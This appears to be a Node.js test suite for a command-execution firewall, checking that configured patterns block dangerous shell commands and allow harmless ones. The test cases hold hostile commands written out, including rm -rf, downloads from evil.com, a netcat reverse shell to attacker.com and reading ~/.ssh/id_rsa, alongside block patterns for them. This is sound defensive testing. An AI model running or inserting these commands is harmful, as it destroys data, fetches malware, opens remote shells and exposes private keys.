/**
 * Command Execution Protection Tests
 * 
 * Tests command blocking with multiple methods:
 * 1. execSync direct commands
 * 2. spawn/exec with shell
 * 3. Pipe bypass attempts
 * 4. Cross-platform commands (cd, echo, etc.)
 * 5. Blocked patterns detection
 * 6. Allowed commands whitelist
 */

const path = require('path');
const fs = require('fs');
const {
  isWindows,
  setupTestDir,
  cleanupTestDir,
  writeMinimalConfig,
  runWithFirewall,
  escapePath,
  isBlocked,
  TestTracker
} = require('../utils');

/**
 * Run the suite of command execution protection tests and collect their results.
 *
 * Executes blocked-patterns, allowed-commands, and spawn/exec variant tests (with
 * platform-specific branches), tracking pass/fail/skip status for each case.
 *
 * @returns {Object} An object summarizing test outcomes with numeric properties:
 *                   `passed` — number of passed tests,
 *                   `failed` — number of failed tests,
 *                   `skipped` — number of skipped tests.
 */
async function runCommandTests() {
  console.log('\nCOMMAND EXECUTION PROTECTION TESTS\n');
  console.log('='.repeat(50));
  
  const tracker = new TestTracker('commands');
  
  // =========================================================================
  // BLOCKED PATTERNS TESTS
  // =========================================================================
  console.log('\n--- Blocked Patterns ---\n');
  
  // Test 1: Block rm -rf (Unix)
  if (!isWindows) {
    await tracker.runTest('blockedPatterns - rm -rf blocked', async () => {
      const testDir = setupTestDir('cmd-rm');
      
      try {
        writeMinimalConfig(testDir, {
          commands: {
            blockedPatterns: [
              { pattern: 'rm\\s+(-rf?|--recursive)', severity: 'critical', description: 'Recursive delete' }
            ],
            allowedCommands: []
          }
        });
        
        const code = `
          const { execSync } = require('child_process');
          try {
            execSync('rm -rf /tmp/test-safe-dir');
            console.log('RM_SUCCESS');
          } catch (e) {
            console.log('RM_BLOCKED:' + e.message);
          }
        `;
        
        const result = await runWithFirewall(testDir, code);
        
        return {
          pass: isBlocked(result.output) || result.output.includes('RM_BLOCKED'),
          reason: result.output.includes('RM_SUCCESS') ? 'rm -rf allowed' : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
    
    // Test 2: Block curl with output
    await tracker.runTest('blockedPatterns - curl -o blocked', async () => {
      const testDir = setupTestDir('cmd-curl');
      
      try {
        writeMinimalConfig(testDir, {
          commands: {
            blockedPatterns: [
              { pattern: 'curl.*(-o|--output|>)', severity: 'high', description: 'Download to file' }
            ],
            allowedCommands: []
          }
        });
        
        const code = `
          const { execSync } = require('child_process');
          try {
            execSync('curl -o /tmp/malware.sh https://evil.com/payload');
            console.log('CURL_SUCCESS');
          } catch (e) {
            console.log('CURL_BLOCKED:' + e.message);
          }
        `;
        
        const result = await runWithFirewall(testDir, code);
        
        return {
          pass: isBlocked(result.output) || result.output.includes('CURL_BLOCKED'),
          reason: result.output.includes('CURL_SUCCESS') ? 'curl -o allowed' : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
    
    // Test 3: Block wget
    await tracker.runTest('blockedPatterns - wget blocked', async () => {
      const testDir = setupTestDir('cmd-wget');
      
      try {
        writeMinimalConfig(testDir, {
          commands: {
            blockedPatterns: [
              { pattern: 'wget', severity: 'high', description: 'Download file' }
            ],
            allowedCommands: []
          }
        });
        
        const code = `
          const { execSync } = require('child_process');
          try {
            execSync('wget https://evil.com/malware.sh');
            console.log('WGET_SUCCESS');
          } catch (e) {
            console.log('WGET_BLOCKED:' + e.message);
          }
        `;
        
        const result = await runWithFirewall(testDir, code);
        
        return {
          pass: isBlocked(result.output) || result.output.includes('WGET_BLOCKED'),
          reason: result.output.includes('WGET_SUCCESS') ? 'wget allowed' : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
    
    // Test 4: Block nc (netcat)
    await tracker.runTest('blockedPatterns - nc (netcat) blocked', async () => {
      const testDir = setupTestDir('cmd-nc');
      
      try {
        writeMinimalConfig(testDir, {
          commands: {
            blockedPatterns: [
              { pattern: 'nc\\s+', severity: 'high', description: 'Network connection' }
            ],
            allowedCommands: []
          }
        });
        
        const code = `
          const { execSync } = require('child_process');
          try {
            execSync('nc -e /bin/bash attacker.com 4444');
            console.log('NC_SUCCESS');
          } catch (e) {
            console.log('NC_BLOCKED:' + e.message);
          }
        `;
        
        const result = await runWithFirewall(testDir, code);
        
        return {
          pass: isBlocked(result.output) || result.output.includes('NC_BLOCKED'),
          reason: result.output.includes('NC_SUCCESS') ? 'nc allowed' : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
    
    // Test 5: Block eval in shell
    await tracker.runTest('blockedPatterns - eval blocked', async () => {
      const testDir = setupTestDir('cmd-eval');
      
      try {
        writeMinimalConfig(testDir, {
          commands: {
            blockedPatterns: [
              { pattern: 'eval\\s+', severity: 'high', description: 'Code evaluation' }
            ],
            allowedCommands: []
          }
        });
        
        const code = `
          const { execSync } = require('child_process');
          try {
            execSync('eval "rm -rf /"');
            console.log('EVAL_SUCCESS');
          } catch (e) {
            console.log('EVAL_BLOCKED:' + e.message);
          }
        `;
        
        const result = await runWithFirewall(testDir, code);
        
        return {
          pass: isBlocked(result.output) || result.output.includes('EVAL_BLOCKED'),
          reason: result.output.includes('EVAL_SUCCESS') ? 'eval allowed' : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
    
    // Test 6: Pipe bypass attempt - dangerous command piped
    await tracker.runTest('blockedPatterns - pipe bypass (echo | bash)', async () => {
      const testDir = setupTestDir('cmd-pipe');
      
      try {
        writeMinimalConfig(testDir, {
          commands: {
            blockedPatterns: [
              { pattern: 'bash\\s+-c', severity: 'medium', description: 'Shell execution' },
              { pattern: '\\|\\s*bash', severity: 'high', description: 'Pipe to bash' }
            ],
            allowedCommands: []
          }
        });
        
        const code = `
          const { execSync } = require('child_process');
          try {
            execSync('echo "curl evil.com | bash" | bash');
            console.log('PIPE_SUCCESS');
          } catch (e) {
            console.log('PIPE_BLOCKED:' + e.message);
          }
        `;
        
        const result = await runWithFirewall(testDir, code);
        
        return {
          pass: isBlocked(result.output) || result.output.includes('PIPE_BLOCKED'),
          reason: result.output.includes('PIPE_SUCCESS') ? 'pipe to bash allowed' : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
  } else {
    // Windows-specific command tests
    await tracker.runTest('blockedPatterns - del /s blocked (Windows)', async () => {
      const testDir = setupTestDir('cmd-del');
      
      try {
        writeMinimalConfig(testDir, {
          commands: {
            blockedPatterns: [
              { pattern: 'del\\s+/[sq]', severity: 'critical', description: 'Recursive delete' },
              { pattern: 'rmdir\\s+/s', severity: 'critical', description: 'Recursive delete' }
            ],
            allowedCommands: []
          }
        });
        
        const code = `
          const { execSync } = require('child_process');
          try {
            execSync('del /s /q C:\\\\temp\\\\safe-dir', { shell: 'cmd.exe' });
            console.log('DEL_SUCCESS');
          } catch (e) {
            console.log('DEL_BLOCKED:' + e.message);
          }
        `;
        
        const result = await runWithFirewall(testDir, code);
        
        return {
          pass: isBlocked(result.output) || result.output.includes('DEL_BLOCKED'),
          reason: result.output.includes('DEL_SUCCESS') ? 'del /s allowed' : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
    
    await tracker.runTest('blockedPatterns - PowerShell Invoke-WebRequest (Windows)', async () => {
      const testDir = setupTestDir('cmd-ps');
      
      try {
        writeMinimalConfig(testDir, {
          commands: {
            blockedPatterns: [
              { pattern: 'Invoke-WebRequest', severity: 'high', description: 'PowerShell download' },
              { pattern: 'iwr\\s+', severity: 'high', description: 'PowerShell download alias' }
            ],
            allowedCommands: []
          }
        });
        
        const code = `
          const { execSync } = require('child_process');
          try {
            execSync('powershell -Command "Invoke-WebRequest https://evil.com -OutFile malware.exe"');
            console.log('PS_SUCCESS');
          } catch (e) {
            console.log('PS_BLOCKED:' + e.message);
          }
        `;
        
        const result = await runWithFirewall(testDir, code);
        
        return {
          pass: isBlocked(result.output) || result.output.includes('PS_BLOCKED'),
          reason: result.output.includes('PS_SUCCESS') ? 'PowerShell allowed' : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
  }
  
  // =========================================================================
  // ALLOWED COMMANDS TESTS
  // =========================================================================
  console.log('\n--- Allowed Commands ---\n');
  
  // Test 7: Allow echo command (cross-platform)
  await tracker.runTest('allowedCommands - echo allowed', async () => {
    const testDir = setupTestDir('cmd-echo');
    
    try {
      writeMinimalConfig(testDir, {
        commands: {
          blockedPatterns: [],
          allowedCommands: ['echo', 'node', 'npm']
        }
      });
      
      const code = `
        const { execSync } = require('child_process');
        try {
          const result = execSync('echo HELLO_WORLD').toString().trim();
          console.log('ECHO_RESULT:' + result);
        } catch (e) {
          console.log('ECHO_BLOCKED:' + e.message);
        }
      `;
      
      const result = await runWithFirewall(testDir, code);
      
      return {
        pass: result.output.includes('HELLO_WORLD'),
        reason: result.output.includes('HELLO_WORLD') ? 'echo works' : 'echo blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // Test 8: Allow node command
  await tracker.runTest('allowedCommands - node allowed', async () => {
    const testDir = setupTestDir('cmd-node');
    
    try {
      writeMinimalConfig(testDir, {
        commands: {
          blockedPatterns: [],
          allowedCommands: ['node', 'npm']
        }
      });
      
      const code = `
        const { execSync } = require('child_process');
        try {
          const result = execSync('node -e "console.log(\\'NODE_WORKS\\')"').toString().trim();
          console.log('NODE_RESULT:' + result);
        } catch (e) {
          console.log('NODE_BLOCKED:' + e.message);
        }
      `;
      
      const result = await runWithFirewall(testDir, code);
      
      return {
        pass: result.output.includes('NODE_WORKS'),
        reason: result.output.includes('NODE_WORKS') ? 'node works' : 'node blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // Test 9: cd command (cross-platform)
  await tracker.runTest('allowedCommands - cd command works', async () => {
    const testDir = setupTestDir('cmd-cd');
    const subDir = path.join(testDir, 'subdir');
    fs.mkdirSync(subDir, { recursive: true });
    
    try {
      writeMinimalConfig(testDir, {
        commands: {
          blockedPatterns: [],
          allowedCommands: ['cd', 'pwd', 'echo']
        }
      });
      
      // cd is a shell builtin, test with pwd
      const pwdCmd = isWindows ? 'cd' : 'pwd';
      const code = `
        const { execSync } = require('child_process');
        try {
          const result = execSync('cd "${subDir}" && ${pwdCmd}', { shell: true }).toString().trim();
          console.log('CD_RESULT:' + result);
        } catch (e) {
          console.log('CD_BLOCKED:' + e.message);
        }
      `;
      
      const result = await runWithFirewall(testDir, code);
      
      return {
        pass: result.output.includes('subdir') || result.output.includes('CD_RESULT'),
        reason: result.output.includes('CD_BLOCKED') ? 'cd blocked' : 'cd works',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // =========================================================================
  // SPAWN VARIANTS TESTS
  // =========================================================================
  console.log('\n--- Spawn Variants ---\n');
  
  // Test 10: spawn with dangerous command
  if (!isWindows) {
    await tracker.runTest('spawn - blocks dangerous commands', async () => {
      const testDir = setupTestDir('cmd-spawn');
      
      try {
        writeMinimalConfig(testDir, {
          commands: {
            blockedPatterns: [
              { pattern: 'rm\\s+(-rf?|--recursive)', severity: 'critical', description: 'Recursive delete' }
            ],
            allowedCommands: []
          }
        });
        
        const code = `
          const { spawn } = require('child_process');
          const proc = spawn('rm', ['-rf', '/tmp/safe-test'], { shell: true });
          proc.on('error', (e) => {
            console.log('SPAWN_BLOCKED:' + e.message);
          });
          proc.on('close', (code) => {
            if (code === 0) {
              console.log('SPAWN_SUCCESS');
            } else {
              console.log('SPAWN_FAILED:' + code);
            }
          });
          setTimeout(() => process.exit(0), 2000);
        `;
        
        const result = await runWithFirewall(testDir, code, { timeout: 5000 });
        
        return {
          pass: isBlocked(result.output) || result.output.includes('SPAWN_BLOCKED') || result.output.includes('SPAWN_FAILED'),
          reason: result.output.includes('SPAWN_SUCCESS') ? 'spawn rm -rf allowed' : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
    
    // Test 11: exec with shell
    await tracker.runTest('exec - blocks shell commands', async () => {
      const testDir = setupTestDir('cmd-exec');
      
      try {
        writeMinimalConfig(testDir, {
          commands: {
            blockedPatterns: [
              { pattern: 'cat\\s+~/\\.(ssh|aws|gnupg)', severity: 'critical', description: 'Read sensitive files' }
            ],
            allowedCommands: []
          }
        });
        
        const code = `
          const { exec } = require('child_process');
          exec('cat ~/.ssh/id_rsa', (error, stdout, stderr) => {
            if (error) {
              console.log('EXEC_BLOCKED:' + error.message);
            } else {
              console.log('EXEC_SUCCESS:' + stdout);
            }
            process.exit(0);
          });
          setTimeout(() => process.exit(0), 2000);
        `;
        
        const result = await runWithFirewall(testDir, code, { timeout: 5000 });
        
        return {
          pass: isBlocked(result.output) || result.output.includes('EXEC_BLOCKED'),
          reason: result.output.includes('EXEC_SUCCESS') ? 'cat ~/.ssh allowed' : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
    
    // Test 12: execFile variant
    await tracker.runTest('execFile - blocks dangerous scripts', async () => {
      const testDir = setupTestDir('cmd-execfile');
      
      try {
        writeMinimalConfig(testDir, {
          commands: {
            blockedPatterns: [
              { pattern: '\\.sh$', severity: 'medium', description: 'Shell script execution' }
            ],
            allowedCommands: []
          }
        });
        
        // Create a test script
        const scriptPath = path.join(testDir, 'test.sh');
        fs.writeFileSync(scriptPath, '#!/bin/bash\necho "SCRIPT_EXECUTED"');
        fs.chmodSync(scriptPath, 0o755);
        
        const code = `
          const { execFile } = require('child_process');
          execFile('${escapePath(scriptPath)}', (error, stdout, stderr) => {
            if (error) {
              console.log('EXECFILE_BLOCKED:' + error.message);
            } else {
              console.log('EXECFILE_SUCCESS:' + stdout);
            }
            process.exit(0);
          });
          setTimeout(() => process.exit(0), 2000);
        `;
        
        const result = await runWithFirewall(testDir, code, { timeout: 5000 });
        
        // Script execution should work but pattern should be logged
        return {
          pass: result.output.includes('EXECFILE_SUCCESS') || 
                result.output.includes('EXECFILE_BLOCKED') ||
                isBlocked(result.output),
          reason: 'execFile handled',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
  } else {
    tracker.skip('spawn - blocks dangerous commands', 'Windows');
    tracker.skip('exec - blocks shell commands', 'Windows');
    tracker.skip('execFile - blocks dangerous scripts', 'Windows');
  }
  
  return tracker.getSummary();
}

module.exports = { runCommandTests };

// Allow direct execution
if (require.main === module) {
  runCommandTests().then(summary => {
    console.log('\nCommand Tests Summary:');
    console.log(`  Passed: ${summary.passed}`);
    console.log(`  Failed: ${summary.failed}`);
    console.log(`  Skipped: ${summary.skipped}`);
    process.exit(summary.failed > 0 ? 1 : 0);
  });
}